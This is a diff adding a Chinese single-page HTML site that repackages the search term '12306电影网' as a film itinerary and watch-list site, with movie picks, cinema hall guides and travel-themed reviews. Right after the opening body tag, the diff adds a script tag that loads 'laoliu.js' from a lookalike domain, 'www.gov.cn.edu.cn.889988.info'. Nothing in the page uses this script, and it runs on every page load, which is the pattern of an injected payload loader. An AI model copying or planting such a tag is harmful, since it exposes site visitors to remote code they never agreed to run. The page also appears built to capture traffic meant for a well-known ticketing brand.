@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>一二三〇六影单网 - 观影行程规划/片单路线/影院指南 | 12306dianyingwang-h5.github.io</title>
+<meta name="description" content="一二三〇六影单网（12306dianyingwang-h5.github.io）以"观影行程"为概念整理电影片单路线、影院选择指南、电影+出行联动影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="一二三〇六影单网, 12306dianyingwang-h5, 观影行程规划, 电影片单路线, 影院选择指南, 电影出行联动" />
+<meta name="author" content="一二三〇六影单网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#1a3a5c" />
+<link rel="canonical" href="https://12306dianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"一二三〇六影单网",
+  "url":"https://12306dianyingwang-h5.github.io/",
+  "description":"观影行程规划、片单路线、影院选择指南与电影出行联动影评",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://12306dianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#eef3f8; --ink:#0f1f2e; --muted:#5a7489;
+  --line:#c5d6e8; --card:#ffffff;
+  --pri:#1a3a5c; --pri2:#2e6da4; --ticket:#e8a020; --green:#2d8a5e;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.78;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1160px;margin:0 auto;padding:0 18px;}
+
+/* 顶部 */
+.navbar{position:sticky;top:0;z-index:100;background:var(--pri);color:#fff;border-bottom:3px solid var(--pri2);}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.site-brand{font-weight:900;font-size:20px;letter-spacing:1px;}
+.site-brand small{display:block;font-size:10px;opacity:.75;font-weight:400;}
+.nav-links{display:flex;gap:22px;font-size:14px;}
+.nav-links a:hover{color:var(--ticket);}
+.nav-trigger{display:none;width:42px;height:42px;border:none;border-radius:8px;background:var(--pri2);color:#fff;font-size:20px;cursor:pointer;}
+
+/* 首屏 */
+.hero-banner{padding:52px 0 36px;background:
+  linear-gradient(135deg,rgba(26,58,92,.08),rgba(46,109,164,.12)),
+  var(--bg);border-bottom:1px solid var(--line);}
+.hero-banner h1{font-size:32px;margin:0 0 12px;line-height:1.3;}
+.hero-banner h1 em{font-style:normal;color:var(--pri2);}
+.hero-banner p{color:var(--muted);max-width:620px;margin:0 0 20px;font-size:16px;}
+.search-box{display:flex;gap:10px;max-width:520px;}
+.search-box input{flex:1;padding:13px 16px;border:2px solid var(--line);border-radius:10px;font-size:15px;}
+.search-box button{padding:13px 22px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:700;cursor:pointer;}
+
+/* 栏目通用 */
+.zone{padding:40px 0;border-bottom:1px solid var(--line);}
+.zone-head{margin-bottom:24px;}
+.zone-head h2{font-size:25px;margin:0 0 4px;color:var(--pri);}
+.zone-head span{color:var(--muted);font-size:14px;}
+
+/* 栏目1：车票式片单卡片 */
+.tickets{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.ticket{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;position:relative;}
+.ticket::after{content:"";position:absolute;bottom:0;left:0;right:0;height:6px;background:linear-gradient(90deg,var(--pri2),var(--ticket));}
+.ticket-header{background:var(--pri);color:#fff;padding:14px 18px;display:flex;justify-content:space-between;align-items:center;}
+.ticket-header .route{font-size:15px;font-weight:700;}
+.ticket-header .seat{font-size:12px;opacity:.8;}
+.ticket-body{padding:16px 18px;}
+.ticket-body h3{font-size:17px;margin:0 0 6px;}
+.ticket-body p{margin:0;color:var(--muted);font-size:13px;}
+.ticket-body .meta{display:flex;gap:12px;margin-top:10px;font-size:12px;color:var(--pri2);}
+.ticket-body .meta span{background:#eef4fb;padding:2px 8px;border-radius:4px;}
+
+/* 栏目2：观影路线时间轴 */
+.route-map{position:relative;padding-left:40px;}
+.route-map::before{content:"";position:absolute;left:15px;top:0;bottom:0;width:3px;background:linear-gradient(to bottom,var(--pri2),var(--ticket),var(--green));}
+.route-stop{position:relative;margin-bottom:22px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px;}
+.route-stop::before{content:"";position:absolute;left:-31px;top:22px;width:14px;height:14px;border-radius:50%;background:var(--pri2);border:3px solid var(--bg);}
+.route-stop:nth-child(2)::before{background:var(--ticket);}
+.route-stop:nth-child(3)::before{background:var(--green);}
+.route-stop:nth-child(4)::before{background:var(--pri);}
+.route-stop .stop-label{font-size:12px;font-weight:700;color:var(--pri2);margin-bottom:4px;}
+.route-stop h3{margin:0 0 4px;font-size:16px;}
+.route-stop p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：影院选择指南 - 对比表 */
+.cinema-guide{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.cinema-card{border:1px solid var(--line);border-radius:14px;padding:18px;background:var(--card);text-align:center;}
+.cinema-card .icon{font-size:32px;margin-bottom:8px;}
+.cinema-card h3{font-size:15px;margin:0 0 6px;color:var(--pri);}
+.cinema-card p{margin:0;color:var(--muted);font-size:12px;}
+.cinema-card .price{font-size:14px;font-weight:700;color:var(--ticket);margin-top:8px;}
+
+/* 栏目4：出行联动影评 */
+.travel-reviews{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.travel-review{border:1px solid var(--line);border-radius:14px;padding:18px;background:var(--card);border-left:4px solid var(--pri2);}
+.travel-review h3{margin:0 0 6px;font-size:16px;}
+.travel-review .location{font-size:12px;color:var(--ticket);margin-bottom:4px;}
+.travel-review p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.info-grid{display:grid;grid-template-columns:1.2fr .8fr;gap:20px;}
+.info-card{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--card);}
+.info-card h3{margin:0 0 10px;font-size:18px;color:var(--pri);}
+.info-card p,.info-card li{color:var(--muted);font-size:14px;}
+.info-card ul{padding-left:18px;}
+.info-card li{margin:5px 0;}
+.notice-box{background:#eef4fb;border-left:4px solid var(--pri2);padding:14px 16px;border-radius:0 10px 10px 0;font-size:13px;color:var(--pri);margin-top:14px;}
+
+footer{background:var(--pri);color:#a8c4e0;padding:32px 0 40px;font-size:13px;text-align:center;}
+footer a{color:var(--ticket);}
+
+@media(max-width:960px){
+  .tickets{grid-template-columns:1fr 1fr;}
+  .cinema-guide{grid-template-columns:1fr 1fr;}
+  .travel-reviews{grid-template-columns:1fr;}
+  .info-grid{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  .nav-links{display:none;flex-direction:column;position:absolute;top:64px;left:0;right:0;background:var(--pri);padding:10px 0;}
+  .nav-links.active{display:flex;}
+  .nav-links a{padding:12px 20px;border-bottom:1px solid rgba(255,255,255,.1);}
+  .nav-trigger{display:block;}
+  .hero-banner h1{font-size:25px;}
+  .tickets{grid-template-columns:1fr;}
+  .cinema-guide{grid-template-columns:1fr 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="navbar">
+  <div class="wrap nav-inner">
+    <div class="site-brand">一二三〇六影单网<small>12306dianyingwang-h5.github.io</small></div>
+    <button class="nav-trigger" onclick="document.getElementById('navmenu').classList.toggle('active')">☰</button>
+    <nav class="nav-links" id="navmenu">
+      <a href="#tickets">观影行程</a>
+      <a href="#routes">片单路线</a>
+      <a href="#cinemas">影院指南</a>
+      <a href="#reviews">出行影评</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</div>
+
+<section class="hero-banner">
+  <div class="wrap">
+    <h1>一二三〇六影单网：<em>像规划旅程一样规划你的观影清单</em></h1>
+    <p>把"看电影"变成一次出行——片单是路线，影院是站台，影评是沿途风景。原词"12306电影网"蹭铁路售票流量，本站转义为观影行程规划站，不提供盗版播放、不挂网盘提取码、不聚合侵权资源。</p>
+    <form class="search-box" onsubmit="return false;">
+      <input type="text" placeholder="搜索：周末观影 / 长途旅行片单 / IMAX指南 / 电影+城市" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="zone" id="tickets">
+    <div class="zone-head"><h2>🎫 观影行程单</h2><span>车票式片单推荐</span></div>
+    <div class="tickets">
+      <div class="ticket"><div class="ticket-header"><span class="route">周末短途 → 轻松喜剧</span><span class="seat">2小时</span></div><div class="ticket-body"><h3>年会不能停！</h3><p>打工人年终解压首选，大鹏白客组合笑到缺氧。</p><div class="meta"><span>喜剧</span><span>职场</span><span>2023</span></div></div></div>
+      <div class="ticket"><div class="ticket-header"><span class="route">长途飞行 → 史诗巨制</span><span class="seat">3小时</span></div><div class="ticket-body"><h3>奥本海默</h3><p>诺兰最长胶片作品，适合有整块时间的沉浸式观影。</p><div class="meta"><span>传记</span><span>历史</span><span>IMAX</span></div></div></div>
+      <div class="ticket"><div class="ticket-header"><span class="route">雨夜独处 → 悬疑烧脑</span><span class="seat">2.5小时</span></div><div class="ticket-body"><h3>消失的她</h3><p>东南亚海滩悬疑，适合一个人安静拆解线索。</p><div class="meta"><span>悬疑</span><span>犯罪</span><span>2023</span></div></div></div>
+      <div class="ticket"><div class="ticket-header"><span class="route">亲子出行 → 动画冒险</span><span class="seat">1.5小时</span></div><div class="ticket-body"><h3>长安三万里</h3><p>带孩子看唐诗背后的盛唐气象，48首唐诗串起历史。</p><div class="meta"><span>动画</span><span>历史</span><span>国风</span></div></div></div>
+      <div class="ticket"><div class="ticket-header"><span class="route">深夜场 → 文艺慢片</span><span class="seat">2小时</span></div><div class="ticket-body"><h3>爱情神话</h3><p>上海老弄堂里的成年人爱情，适合深夜慢慢品。</p><div class="meta"><span>爱情</span><span>文艺</span><span>方言</span></div></div></div>
+      <div class="ticket"><div class="ticket-header"><span class="route">朋友聚会 → 热血动作</span><span class="seat">2小时</span></div><div class="ticket-body"><h3>流浪地球2</h3><p>集体观影氛围最佳，太空电梯开场就燃到结尾。</p><div class="meta"><span>科幻</span><span>动作</span><span>视效</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="zone" id="routes">
+    <div class="zone-head"><h2>🗺 片单路线规划</h2><span>从入门到进阶的观影路径</span></div>
+    <div class="route-map">
+      <div class="route-stop"><div class="stop-label">第一站 · 入门热身</div><h3>轻松喜剧路线</h3><p>从《年会不能停！》到《独行月球》，适合刚想养成观影习惯的人，每部都能笑着看完。</p></div>
+      <div class="route-stop"><div class="stop-label">第二站 · 类型探索</div><h3>悬疑烧脑路线</h3><p>《消失的她》→《看不见的客人》→《盗梦空间》，逐步升级难度，训练观影逻辑。</p></div>
+      <div class="route-stop"><div class="stop-label">第三站 · 作者表达</div><h3>导演专题路线</h3><p>选定一个导演（诺兰/是枝裕和/宫崎骏），按创作时间线完整观看，理解作者风格演变。</p></div>
+      <div class="route-stop"><div class="stop-label">终点站 · 深度沉浸</div><h3>史诗马拉松</h3><p>《奥本海默》→《教父》三部曲→《七武士》，准备好整块时间，体验电影作为"时间艺术"的极致。</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="cinemas">
+    <div class="zone-head"><h2>🏢 影院选择指南</h2><span>不同场景选不同厅</span></div>
+    <div class="cinema-guide">
+      <div class="cinema-card"><div class="icon">🎬</div><h3>IMAX 激光厅</h3><p>适合视效大片，画面大、亮度高、音效沉浸</p><div class="price">票价：60-120元</div></div>
+      <div class="cinema-card"><div class="icon">🎭</div><h3>CINITY 厅</h3><p>高帧率+高亮度，适合《双子杀手》类高帧电影</p><div class="price">票价：50-100元</div></div>
+      <div class="cinema-card"><div class="icon">🎞</div><h3>杜比影院</h3><p>画质+音效双顶级，适合声音设计复杂的文艺片</p><div class="price">票价：55-110元</div></div>
+      <div class="cinema-card"><div class="icon">🎪</div><h3>普通厅/艺术影院</h3><p>适合独立电影、纪录片、老片重映，氛围感强</p><div class="price">票价：30-60元</div></div>
+    </div>
+  </section>
+
+  <section class="zone" id="reviews">
+    <div class="zone-head"><h2>📝 出行联动影评</h2><span>电影与旅程的交叉点</span></div>
+    <div class="travel-reviews">
+      <div class="travel-review"><div class="location">📍 北京 → 上海（高铁4h）</div><h3>《爱情神话》</h3><p>坐高铁从北京到上海，刚好够看完这部上海方言电影。老弄堂、咖啡馆、梧桐树——电影里的上海比外滩更真实，适合在列车上用手机看完后，落地直接去安福路逛一圈。</p></div>
+      <div class="travel-review"><div class="location">📍 东京 → 京都（新干线2.5h）</div><h3>《千与千寻》</h3><p>新干线上看《千与千寻》有种奇妙的互文：汤屋的列车和窗外掠过的日本乡村，宫崎骏把"旅途"拍成了成长的隐喻。到京都站刚好片尾曲响起。</p></div>
+      <div class="travel-review"><div class="location">📍 洛杉矶 → 旧金山（自驾6h）</div><h3>《心灵奇旅》</h3><p>加州一号公路自驾配《心灵奇旅》——披萨的灵魂火花、纽约的爵士乐、太平洋的日落，电影和公路共同回答一个问题：活着的意义是什么？</p></div>
+      <div class="travel-review"><div class="location">📍 成都 → 重庆（动车2h）</div><h3>《火锅英雄》</h3><p>两座山城之间的动车隧道里看《火锅英雄》，洞中洞、地下地下，刘波和兄弟们在防空洞里开火锅店——现实和电影都在讲"地下的故事"。</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="about">
+    <div class="zone-head"><h2>📌 关于一二三〇六影单网</h2><span>转义说明</span></div>
+    <div class="info-grid">
+      <div class="info-card">
+        <h3>转义逻辑</h3>
+        <p>原词"12306电影网"借铁路售票系统名号蹭流量，大概率是电影资源聚合站。本站将"12306"保留数字辨识度，转义为<b>观影行程规划</b>概念——把看电影当成一次出行来规划。</p>
+        <ul>
+          <li>观影行程单：按场景推荐（周末/长途/雨夜/亲子/深夜/聚会）</li>
+          <li>片单路线：从入门到进阶的观影路径规划</li>
+          <li>影院指南：IMAX/CINITY/杜比/艺术影院选择建议</li>
+          <li>出行联动影评：电影与真实旅程的交叉体验</li>
+        </ul>
+        <div class="notice-box">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不聚合侵权资源、不冒充官方机构。
+          看正版请走合法视频平台、院线与版权方授权渠道。
+        </div>
+      </div>
+      <div class="info-card">
+        <h3>站点信息</h3>
+        <p>网址：<br><b>https://12306dianyingwang-h5.github.io/</b></p>
+        <p>单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+        <h3 style="margin-top:18px;">视觉方案</h3>
+        <p>铁路蓝调（深蓝+钢蓝+车票橙），呼应"行程/车票/路线"概念。布局采用车票式卡片+路线时间轴+影院对比表+出行联动影评，与同系列其他站点 DOM/视觉均不同。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    一二三〇六影单网 · 12306dianyingwang-h5.github.io ｜ 观影行程规划 / 片单路线 / 影院选择指南 / 出行联动影评（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#navmenu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navmenu').classList.remove('active');});
+});
+</script>
+</body>
+</html>
